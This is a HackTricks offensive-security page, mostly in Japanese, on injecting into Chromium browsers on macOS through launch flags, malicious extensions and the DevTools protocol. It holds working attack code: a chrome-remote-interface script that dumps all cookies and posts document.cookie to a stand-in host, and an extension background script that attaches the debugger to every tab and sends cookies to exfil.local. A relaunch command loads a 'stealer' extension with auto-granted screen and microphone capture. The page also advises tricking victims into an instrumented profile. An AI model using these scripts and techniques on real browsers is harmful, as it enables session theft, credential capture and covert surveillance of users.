# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Chromium ベースのブラウザ（Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi、Opera など）は、同じコマンドラインスイッチ、設定ファイル、DevTools オートメーションインターフェイスを利用します。macOS では GUI にアクセスできる任意のユーザが既存のブラウザセッションを終了し、ターゲットの権限で任意のフラグ、拡張機能、または DevTools エンドポイントを有効にして再起動できます。

#### Launching Chromium with custom flags on macOS

macOS は Chromium プロファイルごとに単一の UI インスタンスを保持するため、通常はブラウザを強制終了してから操作する必要があります（例: `osascript -e 'tell application "Google Chrome" to quit'`）。攻撃者は通常、アプリバンドルを変更せず引数を注入するために `open -na "Google Chrome" --args <flags>` で再起動します。このコマンドをユーザの LaunchAgent（`~/Library/LaunchAgents/*.plist`）やログインフックに仕込むと、再起動やログオフ後に改変されたブラウザが自動的に再生成されることが保証されます。

#### `--load-extension` フラグ

`--load-extension` フラグは unpacked extension（カンマ区切りのパス）を自動読み込みします。`--disable-extensions-except` と組み合わせると正当な拡張機能をブロックし、攻撃者のペイロードのみを実行させることができます。悪意ある拡張機能は `debugger`、`webRequest`、`cookies` のような高影響の権限を要求し、DevTools プロトコルへピボットしたり、CSP ヘッダを改変したり、HTTPS を弱体化させたり、ブラウザ起動直後にセッション情報を持ち出したりできます。

#### `--remote-debugging-port` / `--remote-debugging-pipe` フラグ

これらのスイッチは Chrome DevTools Protocol (CDP) を TCP やパイプ経由で公開し、外部ツールがブラウザを操作できるようにします。Google はこのインターフェイスの infostealer による広範な悪用を観測しており、Chrome 136（2025年3月）以降、デフォルトプロファイルではブラウザが非標準の `--user-data-dir` で起動されない限りこれらのスイッチは無視されます。これにより実際のプロファイルに対しては App-Bound Encryption が強制されますが、攻撃者は新しいプロファイルを生成し、被害者にその中で認証させ（フィッシング／トリアージ支援）、CDP 経由でクッキー、トークン、デバイスの信頼状態、あるいは WebAuthn 登録情報を収集することができます。

#### `--user-data-dir` フラグ

このフラグはブラウザプロファイル全体（History、Cookies、Login Data、Preference ファイルなど）を攻撃者が制御するパスにリダイレクトします。モダンな Chrome ビルドを `--remote-debugging-port` と組み合わせる場合に必須であり、改変されたプロファイルを隔離しておけるため、セキュリティプロンプトを無効化し、拡張機能を自動インストールし、デフォルトスキームを変更するような事前構成済みの `Preferences` や `Secure Preferences` ファイルを投入できます。

#### `--use-fake-ui-for-media-stream` フラグ

このスイッチはカメラ／マイクの許可プロンプトをバイパスするため、`getUserMedia` を呼ぶ任意のページが即座にアクセスを得ます。`--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk`、または CDP の `Browser.grantPermissions` コマンドなどと組み合わせることで、ユーザ操作なしに音声／映像の盗撮や画面共有の自動選択、WebRTC の許可チェックの通過を静かに行えます。

## Remote Debugging & DevTools Protocol Abuse

Chrome を専用の `--user-data-dir` と `--remote-debugging-port` で再起動すると、CDP（例: `chrome-remote-interface`、`puppeteer`、`playwright` など経由）でアタッチして高権限なワークフローをスクリプト化できます:

- **Cookie/session theft:** `Network.getAllCookies` と `Storage.getCookies` は、通常であれば App-Bound encryption がファイルシステムアクセスをブロックする場合でも HttpOnly 値を返します。これは CDP が実行中のブラウザにそれらを復号させるためです。
- **Permission tampering:** `Browser.grantPermissions` や `Emulation.setGeolocationOverride` により、カメラ／マイクのプロンプトを回避したり（特に `--use-fake-ui-for-media-stream` と組み合わせた場合）、位置情報ベースのセキュリティチェックを偽装できます。
- **Keystroke/script injection:** `Runtime.evaluate` はアクティブなタブ内で任意の JavaScript を実行できるため、資格情報の抽出、DOM の改変、ナビゲーション後も残る永続的なビーコンの注入などが可能です。
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` や `Fetch.enable` は、ディスクに痕跡を残すことなく認証済みのリクエスト／レスポンスをリアルタイムで傍受できます。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Because Chrome 136 blocks CDP on the default profile, copy/pasting the victim's existing `~/Library/Application Support/Google/Chrome` directory to a staging path no longer yields decrypted cookies. Instead, social-engineer the user into authenticating inside the instrumented profile (e.g., "helpful" support session) or capture MFA tokens in transit via CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (extensions stay in their context) and enables:

- `Network.getAllCookies`/`Fetch.getResponseBody` を使ったサイレントなクッキーおよび認証情報の窃取。
- サイト権限（camera, microphone, geolocation）の変更およびセキュリティ中間画面のバイパスにより、フィッシングページが Chrome のダイアログを偽装できるようになる。
- `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior`、または `Security.handleCertificateError` をプログラムで操作することで、TLS 警告、ダウンロード、あるいは WebAuthn プロンプトのオンパス改ざんを行える。

Load the extension with `--load-extension`/`--disable-extensions-except` so no user interaction is required. A minimal background script that weaponizes the API looks like this:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
拡張機能は `Debugger.paused` イベントを購読して JavaScript の変数を読み取ったり、インラインスクリプトをパッチしたり、ナビゲーションを跨いで維持されるカスタムブレークポイントを仕込むこともできます。すべてがユーザーの GUI セッション内で実行されるため、Gatekeeper や TCC はトリガーされず、この手法はすでにユーザーコンテキストで実行権を獲得している malware にとって理想的です。

### ツール

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Chromium の起動を payload extensions を使って自動化し、インタラクティブな CDP hooks を公開します。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS オペレーター向けにトラフィックの interception と browser instrumentation に特化した類似ツールです。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js ライブラリ。`--remote-debugging-port` インスタンスが起動しているときに Chrome DevTools Protocol のダンプ（cookies, DOM, permissions）をスクリプト化できます。

### 例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
ツールのリンクでさらに例を確認してください。

## 参考文献

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
